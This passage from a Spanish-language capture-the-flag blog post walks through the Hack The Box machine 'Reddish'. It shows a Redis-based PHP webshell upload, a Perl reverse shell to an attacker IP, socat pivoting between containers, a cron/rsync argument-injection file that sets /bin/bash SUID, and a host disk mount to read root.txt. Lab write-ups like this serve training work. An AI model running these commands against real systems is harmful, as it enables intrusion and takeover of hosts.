				              console.log<span class="o">(</span><span class="s2">"HITS incremented:"</span>, data<span class="o">)</span><span class="p">;</span>
						        <span class="o">}</span>,
						        error: <span class="k">function</span> <span class="o">()</span> <span class="o">{</span>
						        <span class="o">}</span>
						    <span class="o">})</span><span class="p">;</span>
						<span class="o">}</span>
</code></pre></div></div>
<p>Procedemos a buscar la ruta quitando lo de <code class="language-plaintext highlighter-rouge">ajax.php...</code></p>

<p>Vamos a usar la <code class="language-plaintext highlighter-rouge">ruta 2</code> suponiendo que se encuentra a nivel del servidor en la ruta <code class="language-plaintext highlighter-rouge">/var/www/html/8924d0549008565c554f8128cd11fda4</code></p>

<p>Nos creamos un Scrip para <code class="language-plaintext highlighter-rouge">pwn_redis-cli.sh</code> y subir una webshell en php a la ruta encontrada <code class="language-plaintext highlighter-rouge">siguiendo los pasos de la web</code> para la Vuln de <code class="language-plaintext highlighter-rouge">RCE de Redis</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

 redis-cli <span class="nt">-h</span> 127.0.0.1 flushall
 <span class="nb">cat </span>pro4shell.php | redis-cli <span class="nt">-h</span> 127.0.0.1 <span class="nt">-x</span> <span class="nb">set </span>crackit
 redis-cli <span class="nt">-h</span> 127.0.0.1 config <span class="nb">set dir</span> /var/www/html/8924d0549008565c554f8128cd11fda4/
 redis-cli <span class="nt">-h</span> 127.0.0.1 config <span class="nb">set </span>dbfilename <span class="s2">"pro4shell.php"</span>
 redis-cli <span class="nt">-h</span> 127.0.0.1 save
</code></pre></div></div>
<p>Ahora vermos que accediendo a la ruta <code class="language-plaintext highlighter-rouge">http://localhost/8924d0549008565c554f8128cd11fda4/pro4shell.php</code> obtenemos nuestra webshell maliciosa subida correctamente,
y ejecutando comando como <code class="language-plaintext highlighter-rouge">www-data</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
http://127.0.0.1/8924d0549008565c554f8128cd11fda4/pro4shell.php?cmd<span class="o">=</span>ip%20a  

1: lo:  mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    <span class="nb">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
7: eth0@if8:  mtu 1500 qdisc noqueue state UP group default 
    <span class="nb">link</span>/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.20.0.2/16 brd 172.20.255.255 scope global eth0
       valid_lft forever preferred_lft forever
9: eth1@if10:  mtu 1500 qdisc noqueue state UP group default 
    <span class="nb">link</span>/ether 02:42:ac:13:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.19.0.2/16 brd 172.19.255.255 scope global eth1
       valid_lft forever preferred_lft forever,multicast,up,lower_up&gt;,multicast,up,lower_up&gt;,up,lower_up&gt;
       
   <span class="s2">"   Funciona!!!
       Pero nos lo borran rapidamente asique toca montarse un script en bash que nos ejecute estos comandos para poder tener un rce constante conforme queramos       
       # ./pwn-redis-cli.sh 
OK
OK
OK
OK
OK"</span>
</code></pre></div></div>
<h1 id="mapeado-de-red-3--uso-de-socat">Mapeado de Red 3 + Uso de SOCAT</h1>
<p>La maquina <code class="language-plaintext highlighter-rouge">www-data</code> tiene conectividad con la maquina <code class="language-plaintext highlighter-rouge">Node-RED</code> y nosotros con esta. Para poder hacernos llegar la <code class="language-plaintext highlighter-rouge">Reverse_shell</code> vamos a tener que subir el binario de <code class="language-plaintext highlighter-rouge">socat</code> que lo podemos descargar desde aqui <a href="url">https://github.com/aledbf/socat-static-binary/releases/tag/v0.0.1</a></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Mapeado de Red:

Node_red: 
	<span class="o">{</span>172.18.0.2<span class="o">}</span> ./socat TCP-LISTEN:4545,fork tcp:10.10.14.12:8989
	<span class="o">{</span>172.19.0.4<span class="o">}</span> <span class="o">[</span>4545] puerto para ponerse a la escucha para recibir una conexion de la otra maquina <span class="nt">-----------</span>→  10.10.14.12:8989 redireccionamiento a nuestra maquina

www-data/redis:
	<span class="o">{</span>172.19.0.2/16<span class="o">}</span> <span class="o">[</span>4545] peticion de conexion para que pase por el contenedor vulnerado y llegue a la maquina Nodered y de ahi a nosotros
	<span class="o">{</span>172.20.0.2/16<span class="o">}</span>

Nuevos Hosts:
	<span class="o">{</span>172.20.0.3<span class="o">}</span> Vemos que esta en un segmento distinto al que desde la maquina Node-RED no llegamos, pero si desde la maquina www-data/redis
	<span class="o">{</span>172.19.0.1<span class="o">}</span>
</code></pre></div></div>

<p>Pues desde aqui, volvemos a usar una <code class="language-plaintext highlighter-rouge">reverse_shell</code> en <code class="language-plaintext highlighter-rouge">perl</code> pero la <code class="language-plaintext highlighter-rouge">URL ENCODEAMOS</code> tal que quede asi:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>No Encode
perl <span class="nt">-e</span> <span class="s1">'use Socket;$i="10.0.0.1";$p=4545;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span>

Si URL Encode
perl%20-e%20%27use%20Socket%3B%24i%3D%2210.0.0.1%22%3B%24p%3D4545%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh%20-i%22%29%3B%7D%3B%27
</code></pre></div></div>

<p>Y obtenemos una conexion de la maquina <code class="language-plaintext highlighter-rouge">www-data/redis</code> hacia la maquina <code class="language-plaintext highlighter-rouge">Node-RED</code> pero que se nos envie con <code class="language-plaintext highlighter-rouge">socat</code> a nuestra maquina atacante <code class="language-plaintext highlighter-rouge">kali</code> gracias a la regla escrita con <code class="language-plaintext highlighter-rouge">socat</code>.
El archivo <code class="language-plaintext highlighter-rouge">socat</code> lo subimos a la maquina con <code class="language-plaintext highlighter-rouge">nv -vlnp 444 &lt; socat</code> y en la maquina <code class="language-plaintext highlighter-rouge">Node-RED</code> procedemos a usar <code class="language-plaintext highlighter-rouge">cat &gt; socat &lt; /dev/tcp/10.10.14.12</code>, chequeamos que se halla pasado correctamente con un <code class="language-plaintext highlighter-rouge">md5sum socat</code> en los dos equipos.</p>

<h1 id="escalada-de-privilegios-para-conseguir-el-usertxt">Escalada de Privilegios para conseguir el <code class="language-plaintext highlighter-rouge">user.txt</code></h1>

<p>Enumeramos la maquina victima</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@www:/home<span class="nv">$ </span>find <span class="nb">.</span> <span class="nt">-name</span> user.txt <span class="nt">-type</span> f 2&gt;/dev/null | xargs <span class="nb">ls</span> <span class="nt">-l</span>
<span class="nt">-r--------</span> 1 1000 1000 33 Apr 23  2018 ./somaro/user.txt
</code></pre></div></div>
<p>Vemos que tenemos que convertirnos como <code class="language-plaintext highlighter-rouge">Somaro</code></p>

<p>Enumeramos SUID ~ nada
Enumeramos tareas Cron ~ Encontramos una Tarea Cron</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@www:/<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /var/spool/cron/crontabs/
<span class="nb">ls</span>: cannot open directory /var/spool/cron/crontabs/: Permission denied
<span class="nt">-------------------------------</span>
<span class="nb">cat</span> /etc/crontab 			nadaa
<span class="nb">ls</span> <span class="nt">-l</span> /etc/cron.d/
total 4
<span class="nt">-rw-r--r--</span> 1 root root 38 May  4  2018 backup
<span class="nt">--------------------</span> SIP <span class="nt">--------------------</span>
</code></pre></div></div>
<p>Aqui tenemos algo : BACKUP</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@www:/backup<span class="nv">$ </span><span class="nb">cat </span>backup.sh 

<span class="nb">cd</span> /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
rsync <span class="nt">-a</span> <span class="k">*</span>.rdb rsync://backup:873/src/rdb/
<span class="nb">cd</span> / <span class="o">&amp;&amp;</span> <span class="nb">rm</span> <span class="nt">-rf</span> /var/www/html/<span class="k">*</span>
rsync <span class="nt">-a</span> rsync://backup:873/src/backup/ /var/www/html/
<span class="nb">chown </span>www-data. /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
</code></pre></div></div>
<p>Procedemos a hacer lo siguiente:</p>

<p>Nos creamos un script llamado <code class="language-plaintext highlighter-rouge">test.rdb</code> que va a ser <code class="language-plaintext highlighter-rouge">ejecutado por root</code> pero <code class="language-plaintext highlighter-rouge">necesitamos meterle</code> el <code class="language-plaintext highlighter-rouge">parametro -e</code> al comando <code class="language-plaintext highlighter-rouge">rsync</code> para <code class="language-plaintext highlighter-rouge">que nos ejecute</code> el archivo <code class="language-plaintext highlighter-rouge">test.rdb</code> con bash por eso hemos tenido que crear un segundo archivo en cuestion:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/
www-data@www:/var/www/html/f187a0ec71ce99642e4f0afbd441a68b<span class="nv">$ </span>
www-data@www:/var/www/html/f187a0ec71ce99642e4f0afbd441a68b<span class="nv">$ </span><span class="nb">touch</span> <span class="nt">--</span> <span class="s1">'-e sh test.rdb'</span>
www-data@www:/var/www/html/f187a0ec71ce99642e4f0afbd441a68b<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'chmod u+s /bin/bash'</span> <span class="o">&gt;</span> test.rdb
www-data@www:/var/www/html/f187a0ec71ce99642e4f0afbd441a68b<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 4
<span class="nt">-rw-r--r--</span> 1 www-data www-data  0 Jun 15 13:47 <span class="nt">-e</span> sh test.rdb
<span class="nt">-rw-r--r--</span> 1 www-data www-data 20 Jun 15 13:47 test.rdb
www-data@www:/var/www/html/f187a0ec71ce99642e4f0afbd441a68b<span class="err">$</span>
</code></pre></div></div>

<p>Chequeamos a ver si la tarea Cron detectada (3min) nos ejecuta este script test.rdb y con un simple bash -p ya seriamos root</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@www:/var/www/html/f187a0ec71ce99642e4f0afbd441a68b<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /bin/bash
<span class="nt">-rwsr-xr-x</span> 1 root root 1029624 Nov  5  2016 /bin/bash
www-data@www:/var/www/html/f187a0ec71ce99642e4f0afbd441a68b<span class="nv">$ </span>bash <span class="nt">-p</span>
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
bash-4.3# <span class="nb">whoami
</span>root
<span class="nt">---------</span> Pillamos la flag del User.txt <span class="nt">------------</span>
bash-4.3# <span class="nb">cd </span>home/somaro/
bash-4.3# <span class="nb">cat </span>user.txt 
c09aca7cb02c968b1e9637d51xxxxxxxxxxx
</code></pre></div></div>

<p>Vemos si encontramos alguna flag de <code class="language-plaintext highlighter-rouge">root.txt</code> pero no hay nada, asiquie seguimos enumerando la maquina y nos fijamos otra vez en el <code class="language-plaintext highlighter-rouge">script de BACKUP</code> 
Aqui tenemos algo : BACKUP:873/src/backup?????</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@www:/backup<span class="nv">$ </span><span class="nb">cat </span>backup.sh 

<span class="nb">cd</span> /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
rsync <span class="nt">-a</span> <span class="k">*</span>.rdb rsync://backup:873/src/rdb/
<span class="nb">cd</span> / <span class="o">&amp;&amp;</span> <span class="nb">rm</span> <span class="nt">-rf</span> /var/www/html/<span class="k">*</span>
rsync <span class="nt">-a</span> rsync://backup:873/src/backup/ /var/www/html/
<span class="nb">chown </span>www-data. /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
</code></pre></div></div>

<h1 id="explotacion-del-siguiente-host-atraves-del-comando-rsync">Explotacion del siguiente host atraves del comando rsync</h1>
<p>Ya que Vemos la <code class="language-plaintext highlighter-rouge">/</code> de archivos nosotros con el <code class="language-plaintext highlighter-rouge">comando rsync</code> podemos <code class="language-plaintext highlighter-rouge">subir archivos con el parametro -a</code></p>

<p>Atraves de el binario <code class="language-plaintext highlighter-rouge">rsync</code> con dos archivos que nos vamos a crear!! 
1.- Llamdo <code class="language-plaintext highlighter-rouge">‘-e sh test.rdb’</code> y otro <code class="language-plaintext highlighter-rouge">‘test.rdb’</code> con el que le mandamos que nos haga <code class="language-plaintext highlighter-rouge">chmod +us /bin/bash</code></p>

<p>Dado que en el directorio en el que metemos los archivos <code class="language-plaintext highlighter-rouge">tiene a root con una tarea cron ejecutando todos los archivos que acaben con extension rdb</code></p>

<p>Nos fijamos en lo siguiente</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.3# <span class="nb">cat </span>backup.sh 
<span class="nb">cd</span> /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
rsync <span class="nt">-a</span> <span class="k">*</span>.rdb rsync://backup:873/src/rdb/
<span class="nb">cd</span> / <span class="o">&amp;&amp;</span> <span class="nb">rm</span> <span class="nt">-rf</span> /var/www/html/<span class="k">*</span>
rsync <span class="nt">-a</span> rsync://backup:873/src/backup/ /var/www/html/
<span class="nb">chown </span>www-data. /var/www/html/f187a0ec71ce99642e4f0afbd441a68b

Hamos un PING a BACKUP ya que vemos que se llama con el comando rsync
bash-4.3# ping backup
PING backup <span class="o">(</span>172.20.0.3<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from reddish_composition_backup_1.reddish_composition_internal-network-2 <span class="o">(</span>172.20.0.3<span class="o">)</span>: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>0.094 ms
64 bytes from reddish_composition_backup_1.reddish_composition_internal-network-2 <span class="o">(</span>172.20.0.3<span class="o">)</span>: <span class="nv">icmp_seq</span><span class="o">=</span>2 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>0.066 ms
64 bytes from reddish_composition_backup_1.reddish_composition_internal-network-2 <span class="o">(</span>172.20.0.3<span class="o">)</span>: <span class="nv">icmp_seq</span><span class="o">=</span>3 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>0.069 ms
64 bytes from reddish_composition_backup_1.reddish_composition_internal-network-2 <span class="o">(</span>172.20.0.3<span class="o">)</span>: <span class="nv">icmp_seq</span><span class="o">=</span>4 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>0.076 ms
64 bytes from reddish_composition_backup_1.reddish_composition_internal-network-2 <span class="o">(</span>172.20.0.3<span class="o">)</span>: <span class="nv">icmp_seq</span><span class="o">=</span>5 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>0.092 ms
64 bytes from reddish_composition_backup_1.reddish_composition_internal-network-2 <span class="o">(</span>172.20.0.3<span class="o">)</span>: <span class="nv">icmp_seq</span><span class="o">=</span>6 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>0.083 ms
^C
<span class="nt">---</span> backup ping statistics <span class="nt">---</span>
6 packets transmitted, 6 received, 0% packet loss, <span class="nb">time </span>5000ms
rtt min/avg/max/mdev <span class="o">=</span> 0.066/0.080/0.094/0.010 ms

tenemos otro contenedor en la 172.20.0.3 
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">Recibimos la conexion del siguiente host 172.20.0.3</code></p>

<p>Vamos a probar a usar el comando <code class="language-plaintext highlighter-rouge">rysync</code> como indica a ver que sucede:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.3# rsync rsync://backup:873/src/rdb/				La RAIZ del contenedor de la ip  172.20.0.3??
drwxr-xr-x          4,096 2021/06/15 13:40:01 <span class="nb">.</span>
bash-4.3# rsync rsync://backup:873/src/    
drwxr-xr-x          4,096 2018/07/15 17:42:39 <span class="nb">.</span>
<span class="nt">-rwxr-xr-x</span>              0 2018/05/04 21:01:30 .dockerenv
<span class="nt">-rwxr-xr-x</span>            100 2018/05/04 19:55:07 docker-entrypoint.sh
drwxr-xr-x          4,096 2018/07/15 17:42:41 backup
drwxr-xr-x          4,096 2018/07/15 17:42:39 bin
drwxr-xr-x          4,096 2018/07/15 17:42:38 boot
drwxr-xr-x          4,096 2018/07/15 17:42:39 data
drwxr-xr-x          3,640 2021/06/15 06:54:10 dev
drwxr-xr-x          4,096 2018/07/15 17:42:39 etc
drwxr-xr-x          4,096 2018/07/15 17:42:38 home
drwxr-xr-x          4,096 2018/07/15 17:42:39 lib
drwxr-xr-x          4,096 2018/07/15 17:42:38 lib64
drwxr-xr-x          4,096 2018/07/15 17:42:38 media
drwxr-xr-x          4,096 2018/07/15 17:42:38 mnt
drwxr-xr-x          4,096 2018/07/15 17:42:38 opt
dr-xr-xr-x              0 2021/06/15 06:54:10 proc
drwxr-xr-x          4,096 2021/06/15 13:40:01 rdb
drwx------          4,096 2018/07/15 17:42:38 root
drwxr-xr-x          4,096 2021/06/15 06:54:11 run
drwxr-xr-x          4,096 2018/07/15 17:42:38 sbin
drwxr-xr-x          4,096 2018/07/15 17:42:38 srv
dr-xr-xr-x              0 2021/06/15 06:54:10 sys
drwxrwxrwt          4,096 2021/06/15 14:08:01 tmp
drwxr-xr-x          4,096 2018/07/15 17:42:39 usr
drwxr-xr-x          4,096 2018/07/15 17:42:39 var
bash-4.3# 
</code></pre></div></div>
<p>Vale pues procedemos a hacer lo siguiente.</p>

<p>Debemos pasarnos el Binario de <code class="language-plaintext highlighter-rouge">SOCAT</code> para poder ponernos a la escucha en la ultima maquina que hemos comprometido, y como la maquina anda pelada de todo pero tiene <code class="language-plaintext highlighter-rouge">PERL</code>
Vamos a intentar hacer como un <code class="language-plaintext highlighter-rouge">wget</code> con <code class="language-plaintext highlighter-rouge">perl</code> :</p>

<p>Creamos otra regla en la maquina <code class="language-plaintext highlighter-rouge">Node-RED</code> con <code class="language-plaintext highlighter-rouge">SOCAT</code>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tiramos de SOCAT  para ./socat TCP_LISTEN:6655,fork tcp:10.10.14.12:6666
</code></pre></div></div>
<p>Vamos a montarnos un servidor con <code class="language-plaintext highlighter-rouge">python3 -m http.server 6666</code> para compartir el binario <code class="language-plaintext highlighter-rouge">socat</code> a la maquina <code class="language-plaintext highlighter-rouge">www-data/redis</code> desde nuestro <code class="language-plaintext highlighter-rouge">kali</code>.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># python3 -m http.server 6666                                                                                                                                                                                 1 ⚙</span>
Serving HTTP on 0.0.0.0 port 6666 <span class="o">(</span>http://0.0.0.0:6666/<span class="o">)</span> ...
2021-07-01 12:54:42 VERIFY OK: <span class="nv">depth</span><span class="o">=</span>1, <span class="nv">C</span><span class="o">=</span>UK, <span class="nv">ST</span><span class="o">=</span>City, <span class="nv">L</span><span class="o">=</span>London, <span class="nv">O</span><span class="o">=</span>HackTheBox, <span class="nv">CN</span><span class="o">=</span>HackTheBox CA, <span class="nv">name</span><span class="o">=</span>htb, <span class="nv">emailAddress</span><span class="o">=</span>info@hackthebox.eu
2021-07-01 12:54:42 VERIFY KU OK
2021-07-01 12:54:42 Validating certificate extended key usage
2021-07-01 12:54:42 ++ Certificate has EKU <span class="o">(</span>str<span class="o">)</span> TLS Web Server Authentication, expects TLS Web Server Authentication
2021-07-01 12:54:42 VERIFY EKU OK
2021-07-01 12:54:42 VERIFY OK: <span class="nv">depth</span><span class="o">=</span>0, <span class="nv">C</span><span class="o">=</span>UK, <span class="nv">ST</span><span class="o">=</span>City, <span class="nv">L</span><span class="o">=</span>London, <span class="nv">O</span><span class="o">=</span>HackTheBox, <span class="nv">CN</span><span class="o">=</span>htb, <span class="nv">name</span><span class="o">=</span>htb, <span class="nv">emailAddress</span><span class="o">=</span>info@hackthebox.eu
2021-07-01 12:54:42 Outgoing Data Channel: Cipher <span class="s1">'AES-256-GCM'</span> initialized with 256 bit key
2021-07-01 12:54:42 Incoming Data Channel: Cipher <span class="s1">'AES-256-GCM'</span> initialized with 256 bit key
2021-07-01 12:54:42 Control Channel: TLSv1.2, cipher TLSv1.2 ECDHE-RSA-AES256-GCM-SHA384, 2048 bit RSA
10.10.10.94 - - <span class="o">[</span>01/Jul/2021 13:11:04] <span class="s2">"GET /socat HTTP/1.1"</span> 200 -
</code></pre></div></div>

<p>Ahora para pasarnos el archivo socat a la maquina <code class="language-plaintext highlighter-rouge">www-data/redis (Hacemos como el wget pero con Perl)</code>:</p>

<p>En la Maquina WWW-data como www-data en /tmp/ : Ejecutamos este comando</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl <span class="nt">-e</span> <span class="s1">'use File::Fetch; my $url = "http://172.19.0.4:3322/socat"; my $ff= File::Fetch-&gt;new(uri=&gt;$url); my $file = $ff-&gt;fetch() or die $ff-&gt;error;'</span>
</code></pre></div></div>
<p>Para importarnos <code class="language-plaintext highlighter-rouge">“SOCAT”</code> y asi poder saltar a la ultima maquina y enviarnos la <code class="language-plaintext highlighter-rouge">R-shell</code> a nuestra maquina <code class="language-plaintext highlighter-rouge">WWW-data</code> para <code class="language-plaintext highlighter-rouge">recibir la conexion reversa con SOCAT</code>.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nos ponemos a la escucha con Socat como si fuera un netcat
./socat TCP_LISTEN:9000 STDOUT
</code></pre></div></div>

<p>Recibimos la conexion hacemos un tratamiento de la tty como siempre y seguimos 
<code class="language-plaintext highlighter-rouge">Estamos en la ip 172.20.0.3</code> — host <code class="language-plaintext highlighter-rouge">xxxx</code></p>

<p>Enumeramos las particiones del disco con el comando <code class="language-plaintext highlighter-rouge">$df -h</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@backup:/home# <span class="nb">df</span> <span class="nt">-h</span>
Filesystem      Size  Used Avail Use% Mounted on
overlay         7.3G  3.5G  3.8G  49% /
tmpfs            64M     0   64M   0% /dev
tmpfs          1001M     0 1001M   0% /sys/fs/cgroup
/dev/sda2       7.3G  3.5G  3.8G  49% /backup
shm              64M     0   64M   0% /dev/shm
</code></pre></div></div>
<h1 id="creamos-una-montura-para-alojar-la-particion-entera-de-backup-encontrada">Creamos una montura para alojar la particion entera de backup encontrada</h1>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@backup:/home# <span class="nb">cd</span> /mnt 
root@backup:/mnt# <span class="nb">mkdir test
</span>root@backup:/mnt# mount /dev/sda2 /test 
mount: mount point /test does not exist
root@backup:/mnt#  <span class="nb">cd</span> ..
root@backup:/# mount /dev/sda2 /mnt/test
root@backup:/# <span class="nb">cd</span> <span class="o">!</span><span class="err">$</span>
<span class="nb">cd</span> /mnt/test

<span class="c"># Aqui ya tenemos montada la particion del ultimo sistema o maquina en nuestra ip de 172.20.0.3 que acababamos de ganar acceso</span>
root@backup:/mnt/test# <span class="nb">ls
</span>bin   home            lib64       opt   sbin  tmp      vmlinuz.old
boot  initrd.img      lost+found  proc  snap  usr
dev   initrd.img.old  media       root  srv   var
etc   lib             mnt         run   sys   vmlinuz
root@backup:/mnt/test# <span class="nb">ls</span> <span class="nt">-la</span>
total 116
drwxr-xr-x 23 root root  4096 Apr  9 12:09 <span class="nb">.</span>
drwxr-xr-x  1 root root  4096 Jul  1 11:38 ..
<span class="nt">-rw-------</span>  1 root root    48 Apr  9 12:09 .bash_history
drwxr-xr-x  2 root root  4096 Jul 16  2018 bin
drwxr-xr-x  2 root root  4096 Jul 15  2018 boot
drwxr-xr-x  4 root root  4096 Jul 15  2018 dev
drwxr-xr-x 98 root root  4096 Apr  9 11:59 etc
drwxr-xr-x  5 root root  4096 Apr  9 11:55 home
lrwxrwxrwx  1 root root    33 Jul 16  2018 initrd.img -&gt; boot/initrd.img-4.4.0-130-generic
lrwxrwxrwx  1 root root    33 Apr 20  2018 initrd.img.old -&gt; boot/initrd.img-4.4.0-119-generic
drwxr-xr-x 24 root root  4096 Apr  9 11:35 lib
drwxr-xr-x  2 root root  4096 Jul 15  2018 lib64
drwx------  2 root root 16384 Apr  1  2018 lost+found
drwxr-xr-x  3 root root  4096 Jul 15  2018 media
drwxr-xr-x  2 root root  4096 Jul 15  2018 mnt
drwxr-xr-x  3 root root  4096 Jul 15  2018 opt
drwxr-xr-x  2 root root  4096 Jul 15  2018 proc
drwx------  5 root root  4096 Jul 16  2018 root
drwxr-xr-x  2 root root  4096 Jul 15  2018 run
drwxr-xr-x  2 root root 12288 Apr  9 12:08 sbin
drwxr-xr-x  2 root root  4096 Jul 15  2018 snap
drwxr-xr-x  2 root root  4096 Jul 15  2018 srv
drwxr-xr-x  2 root root  4096 Jul 15  2018 sys
drwxrwxrwt  9 root root  4096 Jul  1 11:17 tmp
drwxr-xr-x 10 root root  4096 Jul 15  2018 usr
drwxr-xr-x 13 root root  4096 Jul 15  2018 var
lrwxrwxrwx  1 root root    30 Jul 16  2018 vmlinuz -&gt; boot/vmlinuz-4.4.0-130-generic
lrwxrwxrwx  1 root root    30 Apr 20  2018 vmlinuz.old -&gt; boot/vmlinuz-4.4.0-119-generic

Sacamos la Flag de <span class="sb">`</span>root.txt<span class="sb">`</span>
<span class="sb">```</span>bash
root@backup:/mnt/test# <span class="nb">cd </span>root
root@backup:/mnt/test/root# <span class="nb">ls
</span>root.txt
root@backup:/mnt/test/root# <span class="nb">cat </span>root.txt 
50d0db644c8d5ff5312ef3d17xxxxxxx
root@backup:/mnt/test/root# 
</code></pre></div></div>

<p>Esta Maquina me tenso el A… Maquina Rooteada =D Dificultad - INSANE - Pivoting de cara al eCPPTv2</p>

</div>


<div class="comments">
<div id="disqus_thread"></div>
<script>
 var disqus_config = function () {
     this.page.url = 'http://localhost:4000/2021/07/01/Reddish.html';
     this.page.identifier = '/2021/07/01/Reddish';
     this.page.title = 'Maquina  Retirada Reddish de Hack The Box (Necesario VIP)';
 };

 (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
     var d = document, s = d.createElement('script');

     s.src = '//bitbrain-github-io.disqus.com/embed.js';

     s.setAttribute('data-timestamp', +new Date());
     (d.head || d.body).appendChild(s);
 })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>

</div>




<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/2022/06/27/Trick.html">
            Maquina  Retirada Trick de Hack The Box (Necesario VIP)
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2022/06/15/Attacktive-Directory.html">
            Maquina Retirada Search de Hack The Box (Necesario VIP)
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2022/06/05/Search-AD.html">
            Maquina Retirada Search de Hack The Box (Necesario VIP)
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>all tags</h2>
  <div class="tag-cloud"><a href="/tag/%26/" class="set-1">&</a> <a href="/tag/%2C/" class="set-1">,</a> <a href="/tag/1.8%2C/" class="set-1">1.8,</a> <a href="/tag/4.4%2C/" class="set-1">4.4,</a> <a href="/tag/8.6%2C/" class="set-1">8.6,</a> <a href="/tag/ad/" class="set-1">AD</a> <a href="/tag/adrotate%2C/" class="set-1">ADRotate,</a> <a href="/tag/aspreproast/" class="set-1">ASPREPRoast</a> <a href="/tag/asrep-roast%2C/" class="set-1">ASREP-Roast,</a> <a href="/tag/asreproast/" class="set-1">ASREPRoast</a> <a href="/tag/active/" class="set-1">Active</a> <a href="/tag/admin%2C/" class="set-1">Admin,</a> <a href="/tag/admins/" class="set-1">Admins</a> <a href="/tag/admins%2C/" class="set-1">Admins,</a> <a href="/tag/archivos/" class="set-1">Archivos</a> <a href="/tag/attack%2C/" class="set-1">Attack,</a> <a href="/tag/attacks/" class="set-1">Attacks</a> <a href="/tag/autopwn%2C/" class="set-1">AutoPwn,</a> <a href="/tag/azure/" class="set-1">Azure</a> <a href="/tag/bof%2C/" class="set-1">BOF,</a> <a href="/tag/bin/" class="set-1">Bin</a> <a href="/tag/blind%2C/" class="set-1">Blind,</a> <a href="/tag/bloodhound%2C/" class="set-1">BloodHound,</a> <a href="/tag/bruta%2C/" class="set-1">Bruta,</a> <a href="/tag/bruteforce%2C/" class="set-1">BruteForce,</a> <a href="/tag/bruteforce%2C/" class="set-1">Bruteforce,</a> <a href="/tag/burpsuite%2C/" class="set-1">Burpsuite,</a> <a href="/tag/bypass/" class="set-1">ByPass</a> <a href="/tag/bypass%2C/" class="set-1">Bypass,</a> <a href="/tag/ca/" class="set-1">CA</a> <a href="/tag/cgi-bin%2C/" class="set-1">CGI-BIN,</a> <a href="/tag/cron%2C/" class="set-1">CRON,</a> <a href="/tag/csrf/" class="set-1">CSRF</a> <a href="/tag/curl%2C/" class="set-1">CURL,</a> <a href="/tag/chkrootkit%2C/" class="set-1">Chkrootkit,</a> <a href="/tag/churrasco%2C/" class="set-1">Churrasco,</a> <a href="/tag/cifrado/" class="set-1">Cifrado</a> <a 